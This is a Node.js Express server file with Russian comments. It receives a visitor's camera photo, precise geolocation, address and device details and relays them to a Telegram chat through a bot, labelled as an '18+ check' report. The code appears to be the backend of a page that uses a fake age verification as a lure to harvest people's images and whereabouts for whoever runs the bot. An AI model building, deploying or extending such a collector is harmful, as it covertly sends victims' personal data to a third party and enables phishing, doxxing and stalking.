// server/index.js
import 'dotenv/config';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';         // обязателен
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';     // дефолтный чат (опц.)
const STATIC_ORIGIN = process.env.STATIC_ORIGIN || '*';         // домен твоего сайта или '*'

// ==== App ====
const app = express();

// Body limits (фото идёт как base64 dataURL)
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// CORS (в проде лучше сузить до твоего домена)
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ==== Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// Раздача статики (app.js, css, картинки)
app.use(express.static(PUBLIC_DIR));

// Главная страница /
app.get('/', (_req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// ==== Utils ====
function escapeHTML(s = '') {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function b64ToBuffer(dataUrl = '') {
  // data:image/jpeg;base64,/9j/...
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('Missing TELEGRAM_BOT_TOKEN');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo buffer');

  // В Node 18+ доступны fetch/FormData/Blob из undici
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// ==== Routes ====
app.get('/health', (_req, res) => res.json({ ok: true }));

/**
 * POST /api/report
 * Body: {
 *   userAgent, platform, iosVersion, isSafari,
 *   geo: {lat, lon, acc, ts} | null,
 *   address: string | null,
 *   photoBase64: "data:image/jpeg;base64,...",
 *   note: string | null,
 *   chatId: string | number (опц., если не используешь DEFAULT_CHAT_ID)
 * }
 */
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent,
      platform,
      iosVersion,
      isSafari,
      geo,
      address,
      photoBase64,
      note,
      chatId
    } = req.body || {};

    const chat_id =
      chatId && /^-?\d+$/.test(String(chatId)) ? String(chatId) : DEFAULT_CHAT_ID;

    if (!BOT_TOKEN) return res.status(500).json({ ok: false, error: 'No BOT token (env TELEGRAM_BOT_TOKEN)' });
    if (!chat_id) return res.status(400).json({ ok: false, error: 'No chat_id (env TELEGRAM_CHAT_ID or body.chatId)' });
    if (!photoBase64) return res.status(400).json({ ok: false, error: 'No photoBase64' });

    const lines = [
      '<b>Новый отчёт 18+ проверка</b>',
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
      geo
        ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>`
        : 'Geo: <code>нет</code>',
      address ? `Addr: <code>${escapeHTML(address)}</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);

    const caption = lines.join('\n');
    const buf = b64ToBuffer(photoBase64);

    const tg = await sendPhotoToTelegram({
      chatId: chat_id,
      caption,
      photoBuf: buf
    });

    res.json({ ok: true, result: tg.result });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== Start ====
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
});
